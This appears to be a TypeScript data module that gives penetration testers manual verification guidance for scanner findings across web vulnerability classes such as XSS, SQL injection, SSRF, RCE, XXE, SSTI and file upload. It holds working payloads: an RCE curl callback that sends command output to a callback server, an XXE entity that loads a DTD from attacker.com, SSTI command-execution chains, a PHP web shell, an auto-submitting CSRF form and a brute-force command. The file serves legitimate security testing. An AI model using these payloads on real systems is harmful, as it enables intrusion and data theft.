/**
 * Testing Guidance Data
 * Provides actionable next steps for security testers to manually verify and explore findings.
 */

export interface ToolRecommendation {
  name: string;
  category: 'proxy' | 'scanner' | 'fuzzer' | 'exploitation' | 'recon' | 'utility';
  description: string;
  command?: string;
  link?: string;
}

export interface PayloadExample {
  name: string;
  payload: string;
  context: string;
  expectedBehavior: string;
}

export interface TestingGuidance {
  title: string;
  description: string;
  manualVerificationSteps: string[];
  tools: ToolRecommendation[];
  payloadExamples?: PayloadExample[];
  falsePositiveIndicators: string[];
  exploitationPath?: string[];
  relatedTags?: string[];
}

export const testingGuidanceByTag: Record<string, TestingGuidance> = {
  xss: {
    title: 'XSS Testing Guide',
    description: 'Steps to manually verify and explore Cross-Site Scripting vulnerabilities',
    manualVerificationSteps: [
      'Identify the injection point from the Nuclei finding (check matched-at URL)',
      'Reproduce the original payload in a browser or Burp Suite',
      'Test if the payload executes (check browser console for execution)',
      'Try alternative payloads to bypass potential filters',
      'Test for stored vs reflected behavior - does it persist after page reload?',
      'Check if the vulnerability affects other users (session context)',
      'Identify the context: HTML body, attribute, JavaScript, URL, or CSS',
    ],
    tools: [
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Use Repeater to test payloads, Intruder for fuzzing',
        command: 'Right-click request > Send to Repeater',
      },
      {
        name: 'XSStrike',
        category: 'scanner',
        description: 'Automated XSS scanner with WAF bypass capabilities',
        command: 'python xsstrike.py -u "https://target.com/page?param=test"',
        link: 'https://github.com/s0md3v/XSStrike',
      },
      {
        name: 'dalfox',
        category: 'scanner',
        description: 'Fast parameter analysis and XSS scanner written in Go',
        command: 'dalfox url "https://target.com/page?param=test" --blind your.xss.ht',
        link: 'https://github.com/hahwul/dalfox',
      },
      {
        name: 'Browser DevTools',
        category: 'utility',
        description: 'Check Console for script execution and Network tab for requests',
        command: 'F12 > Console tab',
      },
    ],
    payloadExamples: [
      {
        name: 'Basic Alert',
        payload: '<script>alert(document.domain)</script>',
        context: 'HTML body injection',
        expectedBehavior: 'Alert box showing current domain',
      },
      {
        name: 'Event Handler',
        payload: '<img src=x onerror=alert(1)>',
        context: 'When script tags are filtered',
        expectedBehavior: 'Alert on image load error',
      },
      {
        name: 'SVG Payload',
        payload: '<svg/onload=alert(1)>',
        context: 'Bypass for certain filters',
        expectedBehavior: 'Alert on SVG load',
      },
      {
        name: 'Attribute Escape',
        payload: '" onmouseover="alert(1)" x="',
        context: 'Inside HTML attribute',
        expectedBehavior: 'Alert on mouseover',
      },
      {
        name: 'Template Literal',
        payload: '${alert(1)}',
        context: 'Inside JavaScript template literal',
        expectedBehavior: 'Alert when template is evaluated',
      },
      {
        name: 'Polyglot',
        payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        context: 'Multiple context bypass',
        expectedBehavior: 'Works in various injection contexts',
      },
    ],
    falsePositiveIndicators: [
      'Payload is reflected but HTML-encoded (< becomes &lt;)',
      'Payload appears in response but inside a JavaScript string without breaking syntax',
      'Content-Type is not text/html (e.g., application/json)',
      'CSP header blocks inline script execution',
      'X-XSS-Protection header active and blocking',
      'Response is in a sandboxed iframe',
    ],
    exploitationPath: [
      'Session hijacking via document.cookie exfiltration',
      'Keylogging on sensitive forms',
      'Phishing via DOM manipulation',
      'CSRF token theft',
      'Admin account takeover if stored XSS',
      'Cryptocurrency mining via injected scripts',
    ],
    relatedTags: ['csrf', 'csp', 'clickjacking'],
  },

  sqli: {
    title: 'SQL Injection Testing Guide',
    description: 'Steps to manually verify and explore SQL Injection vulnerabilities',
    manualVerificationSteps: [
      'Review the Nuclei finding for the injection point and payload used',
      'Reproduce the finding manually using curl or Burp Suite',
      'Identify the database type (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)',
      'Determine injection type: in-band, blind (boolean/time), or out-of-band',
      'Test for UNION-based data extraction if applicable',
      'Enumerate database schema and sensitive tables',
      'Check for stacked queries support',
      'Test if the injection is in INSERT/UPDATE/DELETE context',
    ],
    tools: [
      {
        name: 'sqlmap',
        category: 'exploitation',
        description: 'Automated SQL injection and database takeover tool',
        command: 'sqlmap -u "https://target.com/page?id=1" --dbs --batch --risk=3 --level=5',
        link: 'https://sqlmap.org/',
      },
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Use Repeater for manual testing, Scanner for automated detection',
        command: 'Right-click request > Send to Repeater',
      },
      {
        name: 'ghauri',
        category: 'exploitation',
        description: 'Advanced SQL injection detection and exploitation tool',
        command: 'ghauri -u "https://target.com/page?id=1" --dbs',
        link: 'https://github.com/r0oth3x49/ghauri',
      },
      {
        name: 'SQLiPy',
        category: 'utility',
        description: 'Burp Suite extension that integrates sqlmap',
        link: 'https://github.com/codewatchorg/sqlipy',
      },
    ],
    payloadExamples: [
      {
        name: 'Single Quote Test',
        payload: "' OR '1'='1",
        context: 'String-based injection',
        expectedBehavior: 'Bypass authentication or return all records',
      },
      {
        name: 'UNION Detection',
        payload: "' UNION SELECT NULL,NULL,NULL--",
        context: 'Column enumeration',
        expectedBehavior: 'No error means correct column count',
      },
      {
        name: 'Time-Based Blind (MySQL)',
        payload: "' AND SLEEP(5)--",
        context: 'MySQL blind injection',
        expectedBehavior: '5 second delay in response',
      },
      {
        name: 'Time-Based Blind (MSSQL)',
        payload: "'; WAITFOR DELAY '0:0:5'--",
        context: 'MSSQL blind injection',
        expectedBehavior: '5 second delay in response',
      },
      {
        name: 'Error-Based (MySQL)',
        payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        context: 'MySQL error-based',
        expectedBehavior: 'Database version in error message',
      },
      {
        name: 'Boolean-Based Blind',
        payload: "' AND 1=1-- (vs) ' AND 1=2--",
        context: 'Comparing responses',
        expectedBehavior: 'Different response content for true vs false',
      },
    ],
    falsePositiveIndicators: [
      'Application returns generic error for any special character',
      'WAF is blocking and returning WAF error page',
      'Payload appears in response but query is parameterized',
      'Error message is from application layer, not database',
      'The application uses an ORM with proper escaping',
    ],
    exploitationPath: [
      'Data exfiltration (customer data, credentials)',
      'Authentication bypass',
      'Privilege escalation within database',
      'File system access via INTO OUTFILE (MySQL) or COPY (PostgreSQL)',
      'Command execution via xp_cmdshell (MSSQL)',
      'Reading sensitive files via LOAD_FILE()',
    ],
    relatedTags: ['rce', 'lfi', 'auth-bypass'],
  },

  ssrf: {
    title: 'SSRF Testing Guide',
    description: 'Steps to manually verify and explore Server-Side Request Forgery vulnerabilities',
    manualVerificationSteps: [
      'Identify the parameter accepting URL/hostname input',
      'Set up a callback server (Burp Collaborator, interactsh, or your own)',
      'Test basic SSRF with external callback URL',
      'Test internal network access (127.0.0.1, 169.254.169.254, internal IPs)',
      'Test protocol handlers (file://, gopher://, dict://, ftp://)',
      'Check for cloud metadata endpoint access',
      'Test URL parser bypasses (IP encoding, DNS rebinding)',
      'Check if response content is returned or only status',
    ],
    tools: [
      {
        name: 'Burp Collaborator',
        category: 'recon',
        description: 'Out-of-band callback detection',
        command: 'Burp Suite Pro > Burp Collaborator client',
      },
      {
        name: 'interactsh',
        category: 'recon',
        description: 'Open-source OOB interaction server',
        command: 'interactsh-client',
        link: 'https://github.com/projectdiscovery/interactsh',
      },
      {
        name: 'SSRFmap',
        category: 'exploitation',
        description: 'Automated SSRF fuzzer and exploitation',
        command: 'python ssrfmap.py -r request.txt -p url -m readfiles',
        link: 'https://github.com/swisskyrepo/SSRFmap',
      },
      {
        name: 'Gopherus',
        category: 'exploitation',
        description: 'Generate gopher payloads for SSRF exploitation',
        command: 'gopherus --exploit mysql',
        link: 'https://github.com/tarunkant/Gopherus',
      },
    ],
    payloadExamples: [
      {
        name: 'AWS Metadata',
        payload: 'http://169.254.169.254/latest/meta-data/',
        context: 'AWS cloud environment',
        expectedBehavior: 'AWS instance metadata returned',
      },
      {
        name: 'GCP Metadata',
        payload: 'http://metadata.google.internal/computeMetadata/v1/',
        context: 'GCP cloud environment (needs header)',
        expectedBehavior: 'GCP instance metadata',
      },
      {
        name: 'Internal Port Scan',
        payload: 'http://127.0.0.1:22/',
        context: 'Port scanning',
        expectedBehavior: 'Different response for open vs closed ports',
      },
      {
        name: 'File Protocol',
        payload: 'file:///etc/passwd',
        context: 'Local file read',
        expectedBehavior: 'Contents of passwd file',
      },
      {
        name: 'IPv6 Localhost',
        payload: 'http://[::1]/',
        context: 'IPv6 filter bypass',
        expectedBehavior: 'Access to localhost via IPv6',
      },
      {
        name: 'Decimal IP',
        payload: 'http://2130706433/',
        context: 'Decimal encoding of 127.0.0.1',
        expectedBehavior: 'Filter bypass for localhost',
      },
    ],
    falsePositiveIndicators: [
      'Application validates URL scheme (http/https only)',
      'Response contains error about invalid URL format',
      'Application uses allowlist for target hosts',
      'Callback received but from client IP (not SSRF)',
      'The URL is fetched client-side, not server-side',
    ],
    exploitationPath: [
      'Cloud credential theft via metadata service',
      'Internal network scanning and service discovery',
      'Access to internal admin interfaces',
      'Data exfiltration from internal databases',
      'RCE via internal services (Redis, Memcached)',
      'Pivoting to other internal systems',
    ],
    relatedTags: ['rce', 'lfi', 'open-redirect'],
  },

  rce: {
    title: 'Remote Code Execution Testing Guide',
    description: 'Steps to carefully verify RCE vulnerabilities with minimal impact',
    manualVerificationSteps: [
      'Review the Nuclei finding payload and understand the injection point',
      'NEVER execute destructive commands - use passive detection first',
      'Use time-based detection (sleep, ping with timing)',
      'Use DNS-based out-of-band detection',
      'Identify the underlying OS (Linux vs Windows)',
      'Determine the execution context (web user, root, container)',
      'Check if output is returned (blind vs verbose RCE)',
      'Document the exact payload and reproduction steps',
    ],
    tools: [
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Use Repeater for manual payload testing',
        command: 'Right-click request > Send to Repeater',
      },
      {
        name: 'interactsh',
        category: 'recon',
        description: 'Detect blind RCE via DNS/HTTP callbacks',
        command: 'curl http://xyz.oast.fun (in payload)',
        link: 'https://github.com/projectdiscovery/interactsh',
      },
      {
        name: 'Commix',
        category: 'exploitation',
        description: 'Automated command injection exploitation',
        command: 'commix -u "https://target.com/page?cmd=test" --os-cmd=id',
        link: 'https://github.com/commixproject/commix',
      },
      {
        name: 'curl',
        category: 'utility',
        description: 'Reproduce findings with precise control',
        command: 'curl -X POST -d "param=$(id)" https://target.com/page',
      },
    ],
    payloadExamples: [
      {
        name: 'Time-Based (Linux)',
        payload: '; sleep 10',
        context: 'Command injection',
        expectedBehavior: '10 second delay in response',
      },
      {
        name: 'Time-Based (Windows)',
        payload: '& ping -n 10 127.0.0.1',
        context: 'Windows command injection',
        expectedBehavior: '~10 second delay',
      },
      {
        name: 'DNS Callback',
        payload: '; nslookup $(whoami).your.oast.domain',
        context: 'Blind RCE detection',
        expectedBehavior: 'DNS query with username',
      },
      {
        name: 'Curl Callback',
        payload: '| curl http://your.callback.server/$(id|base64)',
        context: 'HTTP-based exfiltration',
        expectedBehavior: 'HTTP request with encoded output',
      },
      {
        name: 'Template Injection',
        payload: '{{config.items()}}',
        context: 'Python Jinja2 SSTI',
        expectedBehavior: 'Configuration dump',
      },
    ],
    falsePositiveIndicators: [
      'Command output appears but is actually from a sandboxed/containerized environment',
      'The delay is caused by network latency, not command execution',
      'Output shows command string but it was not executed',
      'WAF is simulating vulnerable behavior (honeypot)',
    ],
    exploitationPath: [
      'Full server compromise',
      'Data exfiltration',
      'Lateral movement within network',
      'Persistence mechanisms (cron, services)',
      'Cryptocurrency mining',
      'Ransomware deployment (DO NOT TEST)',
    ],
    relatedTags: ['sqli', 'ssrf', 'ssti', 'deserialization'],
  },

  lfi: {
    title: 'Local File Inclusion Testing Guide',
    description: 'Steps to verify and explore Local File Inclusion vulnerabilities',
    manualVerificationSteps: [
      'Identify the file parameter from the Nuclei finding',
      'Reproduce with known files (/etc/passwd on Linux, C:\\Windows\\win.ini on Windows)',
      'Test directory traversal sequences (../, ....//)',
      'Test null byte injection (%00) for older PHP',
      'Test wrapper protocols (php://filter, file://, data://)',
      'Check if the application appends extensions',
      'Look for log file locations for log poisoning',
      'Test for Remote File Inclusion if allow_url_include is on',
    ],
    tools: [
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Use Repeater for manual testing, Intruder for fuzzing paths',
      },
      {
        name: 'LFISuite',
        category: 'scanner',
        description: 'Automated LFI scanner and exploiter',
        command: 'python lfisuite.py',
        link: 'https://github.com/D35m0nd142/LFISuite',
      },
      {
        name: 'ffuf',
        category: 'fuzzer',
        description: 'Fuzz for common file paths',
        command: 'ffuf -u "https://target.com/page?file=FUZZ" -w /path/to/lfi-wordlist.txt',
        link: 'https://github.com/ffuf/ffuf',
      },
    ],
    payloadExamples: [
      {
        name: 'Basic Traversal',
        payload: '../../../etc/passwd',
        context: 'Linux file read',
        expectedBehavior: 'Contents of /etc/passwd',
      },
      {
        name: 'PHP Filter',
        payload: 'php://filter/convert.base64-encode/resource=index.php',
        context: 'PHP source code disclosure',
        expectedBehavior: 'Base64-encoded source code',
      },
      {
        name: 'Null Byte',
        payload: '../../../etc/passwd%00',
        context: 'Bypass extension appending (old PHP)',
        expectedBehavior: 'File read despite appended extension',
      },
      {
        name: 'Double Encoding',
        payload: '..%252f..%252f..%252fetc/passwd',
        context: 'WAF bypass',
        expectedBehavior: 'File read with double URL encoding',
      },
      {
        name: 'Log Poisoning',
        payload: '/var/log/apache2/access.log',
        context: 'After injecting PHP in User-Agent',
        expectedBehavior: 'Code execution via log file',
      },
    ],
    falsePositiveIndicators: [
      'File path appears in error but file content not disclosed',
      'Only specific whitelisted files are accessible',
      'Open_basedir restriction prevents traversal',
      'Application serves static 404 for traversal attempts',
    ],
    exploitationPath: [
      'Source code disclosure',
      'Configuration file access (database credentials)',
      'SSH key theft (/home/user/.ssh/id_rsa)',
      'Log poisoning to RCE',
      'Session file manipulation',
      'Proc filesystem access for sensitive data',
    ],
    relatedTags: ['rce', 'path-traversal', 'file-read'],
  },

  xxe: {
    title: 'XXE Testing Guide',
    description: 'Steps to verify and explore XML External Entity vulnerabilities',
    manualVerificationSteps: [
      'Identify XML parsing endpoints from the Nuclei finding',
      'Test with external DTD to confirm XXE',
      'Set up out-of-band server for blind XXE',
      'Test file reading via file:// protocol',
      'Check for SSRF via http:// in external entity',
      'Test parameter entities for blind exfiltration',
      'Check if error messages leak file contents',
      'Test for DoS via billion laughs (carefully)',
    ],
    tools: [
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Use Repeater for XML payload testing',
      },
      {
        name: 'XXEinjector',
        category: 'exploitation',
        description: 'Automated XXE exploitation',
        command: 'ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --path=/vulnerable',
        link: 'https://github.com/enjoiz/XXEinjector',
      },
      {
        name: 'oxml_xxe',
        category: 'utility',
        description: 'Create XXE payloads in OOXML documents',
        link: 'https://github.com/BuffaloWill/oxml_xxe',
      },
    ],
    payloadExamples: [
      {
        name: 'Basic File Read',
        payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        context: 'Direct file read',
        expectedBehavior: 'File contents in response',
      },
      {
        name: 'Blind XXE (OOB)',
        payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
        context: 'Out-of-band data exfiltration',
        expectedBehavior: 'HTTP callback received',
      },
      {
        name: 'PHP Base64',
        payload: '<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">',
        context: 'PHP environment',
        expectedBehavior: 'Base64-encoded file contents',
      },
      {
        name: 'SSRF via XXE',
        payload: '<!ENTITY xxe SYSTEM "http://internal-server/">',
        context: 'Internal network access',
        expectedBehavior: 'Response from internal server',
      },
    ],
    falsePositiveIndicators: [
      'XML parser configured to disable external entities',
      'Error message about DTD but no actual processing',
      'Content-Type mismatch (not actually parsing XML)',
      'Firewall blocking outbound connections',
    ],
    exploitationPath: [
      'Sensitive file disclosure (configs, source code)',
      'SSRF to internal services',
      'Port scanning via error-based XXE',
      'DoS via entity expansion',
      'NTLM hash capture on Windows',
    ],
    relatedTags: ['ssrf', 'file-read', 'injection'],
  },

  ssti: {
    title: 'SSTI Testing Guide',
    description: 'Steps to verify and explore Server-Side Template Injection vulnerabilities',
    manualVerificationSteps: [
      'Identify the template engine from the Nuclei finding or response',
      'Test with basic math expressions ({{7*7}}, ${7*7})',
      'Confirm code execution context',
      'Identify the template engine (Jinja2, Twig, Freemarker, etc.)',
      'Test for object access and method calls',
      'Check sandbox restrictions',
      'Attempt to read files or execute commands',
      'Document the exact payload chain for RCE',
    ],
    tools: [
      {
        name: 'tplmap',
        category: 'exploitation',
        description: 'Automated SSTI detection and exploitation',
        command: 'python tplmap.py -u "https://target.com/page?name=test"',
        link: 'https://github.com/epinna/tplmap',
      },
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Manual testing with Repeater',
      },
      {
        name: 'SSTImap',
        category: 'exploitation',
        description: 'Modern SSTI exploitation tool',
        command: 'sstimap -u "https://target.com/page?name=test"',
        link: 'https://github.com/vladko312/SSTImap',
      },
    ],
    payloadExamples: [
      {
        name: 'Detection',
        payload: '{{7*7}}',
        context: 'Jinja2/Twig',
        expectedBehavior: '49 in response',
      },
      {
        name: 'Jinja2 RCE',
        payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        context: 'Python Jinja2',
        expectedBehavior: 'Command output',
      },
      {
        name: 'Twig RCE',
        payload: "{{['id']|filter('system')}}",
        context: 'PHP Twig',
        expectedBehavior: 'Command output',
      },
      {
        name: 'Freemarker RCE',
        payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        context: 'Java Freemarker',
        expectedBehavior: 'Command output',
      },
      {
        name: 'ERB Detection',
        payload: '<%= 7*7 %>',
        context: 'Ruby ERB',
        expectedBehavior: '49 in response',
      },
    ],
    falsePositiveIndicators: [
      'Template syntax appears in response but not evaluated',
      'Sandbox prevents dangerous operations',
      'The template engine is client-side only',
      'Template syntax is HTML-encoded',
    ],
    exploitationPath: [
      'Remote code execution',
      'File system access',
      'Environment variable disclosure',
      'Database credential theft',
      'Full server compromise',
    ],
    relatedTags: ['rce', 'injection'],
  },

  idor: {
    title: 'IDOR Testing Guide',
    description: 'Steps to verify Insecure Direct Object Reference vulnerabilities',
    manualVerificationSteps: [
      'Identify the object reference parameter (ID, UUID, filename)',
      'Create two test accounts with different permissions',
      'Access an object belonging to another user',
      'Test for both read and write access',
      'Check if sequential IDs can be enumerated',
      'Test horizontal (same role) vs vertical (different role) access',
      'Look for IDOR in API endpoints, not just web pages',
      'Check GraphQL queries for unauthorized data access',
    ],
    tools: [
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Use Intruder to enumerate IDs',
      },
      {
        name: 'Autorize',
        category: 'utility',
        description: 'Burp extension for automated authorization testing',
        link: 'https://github.com/PortSwigger/autorize',
      },
      {
        name: 'ffuf',
        category: 'fuzzer',
        description: 'Fuzz for accessible object IDs',
        command: 'ffuf -u "https://target.com/api/users/FUZZ" -w numbers.txt -fc 403,404',
        link: 'https://github.com/ffuf/ffuf',
      },
    ],
    payloadExamples: [
      {
        name: 'Sequential ID',
        payload: '/api/users/1 → /api/users/2',
        context: 'Numeric ID enumeration',
        expectedBehavior: "Access to other user's data",
      },
      {
        name: 'UUID Manipulation',
        payload: 'Replace UUID with another known UUID',
        context: 'When UUIDs are used',
        expectedBehavior: "Access to other object's data",
      },
      {
        name: 'Parameter Pollution',
        payload: '/api/orders?user_id=victim_id&user_id=attacker_id',
        context: 'HPP bypass',
        expectedBehavior: "Access to victim's orders",
      },
      {
        name: 'Hash ID Decode',
        payload: 'Decode hashid to find pattern',
        context: 'Encoded IDs (Hashids)',
        expectedBehavior: 'Predictable ID generation',
      },
    ],
    falsePositiveIndicators: [
      'Different data but same user (test data pollution)',
      'Public data that should be accessible to all',
      'Proper authorization returns 403',
      'The object ID is cryptographically random',
    ],
    exploitationPath: [
      'Access to other users data',
      'Modify other users data',
      'Delete other users resources',
      'Privilege escalation',
      'Mass data scraping',
    ],
    relatedTags: ['auth-bypass', 'broken-access-control'],
  },

  'auth-bypass': {
    title: 'Authentication Bypass Testing Guide',
    description: 'Steps to verify authentication bypass vulnerabilities',
    manualVerificationSteps: [
      'Identify the authentication mechanism (session, JWT, API key)',
      'Test direct access to protected endpoints without auth',
      'Check for default credentials',
      'Test parameter manipulation (role=admin, isAdmin=true)',
      'Look for JWT vulnerabilities (none algorithm, weak secret)',
      'Test password reset flow for logic flaws',
      'Check for race conditions in authentication',
      'Test multi-factor authentication bypass',
    ],
    tools: [
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Intercept and modify authentication tokens',
      },
      {
        name: 'jwt_tool',
        category: 'utility',
        description: 'JWT vulnerability testing toolkit',
        command: 'python jwt_tool.py <token> -C -d wordlist.txt',
        link: 'https://github.com/ticarpi/jwt_tool',
      },
      {
        name: 'Hydra',
        category: 'exploitation',
        description: 'Brute force login forms',
        command: 'hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"',
        link: 'https://github.com/vanhauser-thc/thc-hydra',
      },
    ],
    payloadExamples: [
      {
        name: 'JWT None Algorithm',
        payload: 'Change alg to none, remove signature',
        context: 'JWT authentication',
        expectedBehavior: 'Token accepted without verification',
      },
      {
        name: 'Role Parameter',
        payload: 'role=admin in request body',
        context: 'Mass assignment',
        expectedBehavior: 'Elevated privileges',
      },
      {
        name: 'SQL Auth Bypass',
        payload: "admin'--",
        context: 'Login form',
        expectedBehavior: 'Login as admin',
      },
      {
        name: 'HTTP Verb Tampering',
        payload: 'HEAD instead of GET for protected resource',
        context: 'Verb-based access control',
        expectedBehavior: 'Bypass authentication check',
      },
    ],
    falsePositiveIndicators: [
      'Response indicates success but no actual session created',
      'Partial access but full authentication required for sensitive actions',
      'Different response but same authorization level',
    ],
    exploitationPath: [
      'Account takeover',
      'Access to admin functionality',
      'Data breach',
      'Privilege escalation',
      'Persistent access',
    ],
    relatedTags: ['idor', 'sqli', 'jwt'],
  },

  csrf: {
    title: 'CSRF Testing Guide',
    description: 'Steps to verify Cross-Site Request Forgery vulnerabilities',
    manualVerificationSteps: [
      'Identify state-changing actions (password change, email update)',
      'Check for CSRF token presence and validation',
      'Test if token is tied to session',
      'Check SameSite cookie attribute',
      'Test with different Content-Types',
      'Check for origin/referer header validation',
      'Create PoC HTML page to demonstrate exploit',
      'Test JSON-based CSRF with Flash or other vectors',
    ],
    tools: [
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Use Engagement tools > Generate CSRF PoC',
      },
      {
        name: 'CSRF PoC Generator',
        category: 'utility',
        description: 'Generate exploit HTML pages',
      },
    ],
    payloadExamples: [
      {
        name: 'Basic Form CSRF',
        payload: '<form action="https://target.com/change-email" method="POST"><input name="email" value="attacker@evil.com"><input type="submit"></form><script>document.forms[0].submit()</script>',
        context: 'Auto-submitting form',
        expectedBehavior: 'Email changed when victim visits page',
      },
      {
        name: 'JSON CSRF',
        payload: 'Use Flash with 307 redirect',
        context: 'JSON Content-Type',
        expectedBehavior: 'JSON request sent with credentials',
      },
      {
        name: 'GET-based CSRF',
        payload: '<img src="https://target.com/delete?id=1">',
        context: 'GET action modification',
        expectedBehavior: 'Action executed on page load',
      },
    ],
    falsePositiveIndicators: [
      'SameSite=Strict cookie prevents cross-site requests',
      'CSRF token properly validated',
      'Origin header strictly checked',
      'Action requires re-authentication',
    ],
    exploitationPath: [
      'Account settings modification',
      'Password/email change',
      'Financial transactions',
      'Admin action execution',
      'Worm propagation (combined with XSS)',
    ],
    relatedTags: ['xss', 'clickjacking'],
  },

  'open-redirect': {
    title: 'Open Redirect Testing Guide',
    description: 'Steps to verify open redirect vulnerabilities',
    manualVerificationSteps: [
      'Identify the redirect parameter (url, next, redirect, return)',
      'Test with external domain',
      'Try bypass techniques for domain validation',
      'Check if it can be chained with other vulnerabilities',
      'Test for JavaScript protocol (javascript:alert(1))',
      'Check OAuth flows for redirect manipulation',
    ],
    tools: [
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Test redirect parameters in Repeater',
      },
      {
        name: 'OpenRedirex',
        category: 'scanner',
        description: 'Automated open redirect finder',
        link: 'https://github.com/devanshbatham/OpenRedireX',
      },
    ],
    payloadExamples: [
      {
        name: 'Basic Redirect',
        payload: 'https://evil.com',
        context: 'Direct URL parameter',
        expectedBehavior: 'Redirect to external site',
      },
      {
        name: 'Protocol-less',
        payload: '//evil.com',
        context: 'Bypass http/https check',
        expectedBehavior: 'Redirect using current protocol',
      },
      {
        name: 'Backslash Bypass',
        payload: 'https://target.com\\@evil.com',
        context: 'Parser confusion',
        expectedBehavior: 'Redirect to evil.com',
      },
      {
        name: 'URL Encoding',
        payload: 'https://evil%2Ecom',
        context: 'Encoded domain',
        expectedBehavior: 'Bypass domain validation',
      },
      {
        name: 'JavaScript Protocol',
        payload: 'javascript:alert(document.domain)',
        context: 'XSS via redirect',
        expectedBehavior: 'JavaScript execution',
      },
    ],
    falsePositiveIndicators: [
      'Redirect only to same domain',
      'Whitelist properly implemented',
      'User confirmation required before redirect',
    ],
    exploitationPath: [
      'Phishing attacks',
      'OAuth token theft',
      'Bypass URL filters/firewalls',
      'Chain with SSRF',
      'Social engineering',
    ],
    relatedTags: ['ssrf', 'phishing'],
  },

  cve: {
    title: 'CVE Verification Guide',
    description: 'Steps to verify known CVE vulnerabilities',
    manualVerificationSteps: [
      'Look up the CVE on NVD (nvd.nist.gov)',
      'Find the affected versions and compare with target',
      'Review public exploits on Exploit-DB or GitHub',
      'Understand the vulnerability class (RCE, SQLi, etc.)',
      'Reproduce with the provided PoC if available',
      'Check for patches and version information',
      'Verify the exploit conditions match the target',
    ],
    tools: [
      {
        name: 'searchsploit',
        category: 'recon',
        description: 'Search Exploit-DB offline database',
        command: 'searchsploit <cve-number>',
      },
      {
        name: 'NVD Website',
        category: 'recon',
        description: 'Official CVE database',
        link: 'https://nvd.nist.gov/',
      },
      {
        name: 'Metasploit',
        category: 'exploitation',
        description: 'Check for existing modules',
        command: 'search cve:<year>-<number>',
        link: 'https://www.metasploit.com/',
      },
    ],
    payloadExamples: [
      {
        name: 'Version Check',
        payload: 'Check /version, /info, or response headers',
        context: 'Version identification',
        expectedBehavior: 'Confirm vulnerable version',
      },
    ],
    falsePositiveIndicators: [
      'Version is actually patched',
      'Required configuration not present',
      'WAF/IPS blocking exploit',
      'Different software with similar signature',
    ],
    exploitationPath: [
      'Varies by CVE type',
      'Check NVD for impact assessment',
      'Review CVSS score for severity',
    ],
    relatedTags: [],
  },

  'exposed-panel': {
    title: 'Exposed Panel Testing Guide',
    description: 'Steps to investigate exposed admin/management panels',
    manualVerificationSteps: [
      'Identify the technology/product',
      'Check for default credentials',
      'Look for version information',
      'Search for known vulnerabilities',
      'Test for common misconfigurations',
      'Check if authentication can be bypassed',
      'Document the sensitive information accessible',
    ],
    tools: [
      {
        name: 'DefaultCreds-Cheat-Sheet',
        category: 'utility',
        description: 'Database of default credentials',
        link: 'https://github.com/ihebski/DefaultCreds-cheat-sheet',
      },
      {
        name: 'Nuclei',
        category: 'scanner',
        description: 'Run default-login templates',
        command: 'nuclei -u https://target.com/admin -t default-logins/',
      },
    ],
    payloadExamples: [
      {
        name: 'Common Admin Paths',
        payload: '/admin, /administrator, /wp-admin, /phpmyadmin',
        context: 'Path enumeration',
        expectedBehavior: 'Access to admin interface',
      },
      {
        name: 'Default Credentials',
        payload: 'admin:admin, admin:password, root:root',
        context: 'Authentication attempt',
        expectedBehavior: 'Successful login',
      },
    ],
    falsePositiveIndicators: [
      'Panel requires VPN/internal access',
      'Honeypot or decoy panel',
      'Panel is intentionally public (read-only)',
    ],
    exploitationPath: [
      'Full admin access',
      'Data modification/deletion',
      'User management',
      'System configuration changes',
      'Potential RCE via admin features',
    ],
    relatedTags: ['default-login', 'misconfig'],
  },

  'file-upload': {
    title: 'File Upload Testing Guide',
    description: 'Steps to test file upload vulnerabilities',
    manualVerificationSteps: [
      'Identify the upload functionality and accepted file types',
      'Test for extension bypass (double extension, null byte)',
      'Test Content-Type header manipulation',
      'Upload web shells with various extensions',
      'Check where uploaded files are stored',
      'Test for path traversal in filename',
      'Check if files are served with correct Content-Type',
      'Test for SVG/XML upload leading to XSS/XXE',
    ],
    tools: [
      {
        name: 'Burp Suite',
        category: 'proxy',
        description: 'Intercept and modify upload requests',
      },
      {
        name: 'fuxploider',
        category: 'scanner',
        description: 'Automated file upload vulnerability scanner',
        link: 'https://github.com/almandin/fuxploider',
      },
    ],
    payloadExamples: [
      {
        name: 'PHP Web Shell',
        payload: '<?php system($_GET["cmd"]); ?>',
        context: 'Filename: shell.php',
        expectedBehavior: 'RCE via uploaded file',
      },
      {
        name: 'Double Extension',
        payload: 'shell.php.jpg',
        context: 'Extension filtering bypass',
        expectedBehavior: 'PHP execution despite jpg extension',
      },
      {
        name: 'Content-Type Bypass',
        payload: 'Change Content-Type to image/jpeg for .php file',
        context: 'MIME type validation',
        expectedBehavior: 'PHP file uploaded',
      },
      {
        name: 'SVG XSS',
        payload: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
        context: 'SVG upload allowed',
        expectedBehavior: 'XSS when SVG is viewed',
      },
    ],
    falsePositiveIndicators: [
      'File is renamed with random name',
      'Files stored outside web root',
      'Content-Type forced on download',
      'Extension whitelist properly enforced',
    ],
    exploitationPath: [
      'Remote code execution',
      'XSS via uploaded content',
      'Server-side resource exhaustion',
      'Path traversal to overwrite files',
    ],
